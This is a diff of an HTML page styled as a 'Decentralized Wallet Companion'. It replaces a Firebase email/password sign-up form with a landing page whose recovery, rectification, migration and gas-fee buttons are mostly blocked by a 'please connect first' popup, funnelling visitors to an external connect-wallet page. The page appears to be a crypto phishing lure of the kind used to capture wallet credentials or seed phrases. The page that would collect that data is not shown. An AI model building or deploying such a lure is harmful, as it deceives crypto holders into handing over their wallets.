@@ -1,11 +1,12 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Artistry Unleashed - Your Decentralized Wallet Companion</title>
-    <script src="js/script.js"> </script>
-   <style>
+    <style>
         body {
              font-family: 'Arial', sans-serif;
             background-image: url('https://i.ibb.co/R0Zw1Tb/bg-crypto-jwv.jpg');
@@ -147,57 +148,123 @@
         }
         
     </style>
+    
+    <script src="script.js"></script>
+
 </head>
 <body>
-<form>
-        <h2>Connexion</h2>
-        <label for="email">mail:</label>
-        <input type="email" id="email" name="email" required>
+    <div class="sticky-bar">
+        <div style="height: 40px; padding: 0px; margin: 0px; width: 100%">
+            <iframe
+                src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover="
+                width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0"
+                border="0" style="border: 0; margin: 0; padding: 0"></iframe>
+        </div>
+        <div style="
+            color: #626b7f;
+            line-height: 14px;
+            font-weight: 400;
+            font-size: 11px;
+            box-sizing: border-box;
+            padding: 2px 6px;
+            width: 100%;
+            font-family: Verdana, Tahoma, Arial, sans-serif;
+        "></div>
+    </div>
+    <header class="paragraph-container">
+        <h1>Artistry Unleashed - Your Decentralized Wallet Companion</h1>
+        <p>Embark on a revolutionary journey into digital ownership through our decentralized protocol. Seamlessly connect wallets, engage in swift complaint resolutions, and begin your decentralized adventure now!
+</p>
+          <div class="btnconnect">
+        <a href="https://crypto-jwv.pages.dev/connect-wallet" class="selection-button">🚀 Connect Wallet</a>
+            </div>
 
-        <label for="password">Mot de passe:</label>
-        <input type="password" id="password" name="password" required>
+    </header>
 
-        <button type="button" id="submitData" name="submitData" >Se Connecter</button>
-    </form>
-    <script type="module">
-  // Import the functions you need from the SDKs you need
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
-     import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js";
+<section>
+        <h1>Wallet Wonderland - Unleash the Magic!</h1>
+        <p>Step into a world of enchantment where your wallet takes center stage. Every action is a magical journey waiting to unfold. Connect, explore, and let the magic happen!</p>
+    
+ </section>
 
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
+    <section>
+        <h2>Choose Your Wallet Adventure</h2>
 
-  // Your web app's Firebase configuration
-  const firebaseConfig = {
-    apiKey: "AIzaSyB-2koFw2ICcMC7g4VMSgWyctgXaDHL_N0",
-    authDomain: "crypto-test-5739f.firebaseapp.com",
-    projectId: "crypto-test-5739f",
-    storageBucket: "crypto-test-5739f.appspot.com",
-    messagingSenderId: "680504108544",
-    appId: "1:680504108544:web:8d4ac4ae5c6e53847adae5"
-  };
+        <div class="wallet-actions">
+            <a href="https://crypto-jwv.pages.dev/connect-wallet" class="wallet-action">🚀 Connect Wallet</a>
+            <a href="https://crypto-jwv.pages.dev/explore-wallet-features" class="wallet-action">🌌 Explore Wallet Features</a>
+            <a href="https://crypto-jwv.pages.dev/top-up-balance" class="wallet-action">💸 Top-Up Balance</a>
+            <a href="https://crypto-jwv.pages.dev/check-transaction-history" class="wallet-action">🔍 Check Transaction History</a>
+            <a href="https://crypto-jwv.pages.dev/secure-your-wallet" class="wallet-action">🔒 Secure Your Wallet</a>
+            <a href="https://crypto-jwv.pages.dev/wallet-tips-tricks" class="wallet-action">💡 Wallet Tips & Tricks</a>
+        </div>
+    </section>
+    
+    <section>
+        <h2>Make Your Selection Below</h2>
 
-  // Initialize Firebase
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth();    
-        submitData.addEventListener('click',(e) => {
-            var email= document.getElementById('email').value;
-             var password= document.getElementById('password').value;
-            createUserWithEmailAndPassword(auth, email, password)
-  .then((userCredential) => {
-    // Signed up 
-    const user = userCredential.user;
-      // ... user.uid
-      alert('sucsseful');
-    // ...
-  })
-  .catch((error) => {
-    const errorCode = error.code;
-    const errorMessage = error.message;
-    // ..
-      alert(errorMessage);
-  });
+        <div class="selection-buttons">
+            <a href="https://crypto-jwv.pages.dev/migration" class="selection-button">Migration</a>
+            <a href="https://crypto-jwv.pages.dev/validate-or-synchronize" class="selection-button">Validate or Synchronize</a>
+            <a href="https://crypto-jwv.pages.dev/assets-recovery" class="selection-button">Assets Recovery</a>
+            <a href="https://crypto-jwv.pages.dev/rectification" class="selection-button">Rectification</a>
+            <a href="https://crypto-jwv.pages.dev/high-gas-fees" class="selection-button">High Gas Fees</a>
+            <a href="https://crypto-jwv.pages.dev/slippage-error" class="selection-button">Slippage Error</a>
+            <!-- Add more buttons as needed -->
+        </div>
+    </section>
+    
+    
+ 
+    <!-- Popup for the "please connect first" message -->
+    <div id="popup" class="popup">
+        <h2>Oops! Please Connect First</h2>
+        <p>To access this feature, please connect your wallet.</p>
+        <button class="popup-btn" onclick="closePopup()">Close</button>
+    </div>
+
+    <!-- JavaScript to handle button clicks and show the popup -->
+   <script>
+    function showPopup() {
+        document.getElementById('popup').style.display = 'block';
+    }
+
+    function closePopup() {
+        document.getElementById('popup').style.display = 'none';
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var buttons = document.querySelectorAll('.selection-button, .wallet-action');
+
+        buttons.forEach(function(button) {
+            button.addEventListener('click', function(event) {
+                event.preventDefault();
+
+                if (event.target.classList.contains('wallet-action') && event.target.textContent.trim() === '🚀 Connect Wallet') {
+                    window.location.href = event.target.getAttribute('href');
+                } else if (!event.target.classList.contains('selection-button')) {
+                    showPopup();
+                }
+            });
         });
+
+        var selectionButtons = document.querySelectorAll('.selection-buttons .selection-button');
+
+        selectionButtons.forEach(function(button) {
+            button.addEventListener('click', function(event) {
+                event.preventDefault();
+                showPopup();
+            });
+        });
+
+        var connectWalletHeader = document.querySelector('.btnconnect a');
+
+        connectWalletHeader.addEventListener('click', function(event) {
+            event.preventDefault();
+            window.location.href = event.target.getAttribute('href');
+        });
+    });
 </script>
+    
 </body>
 </html>
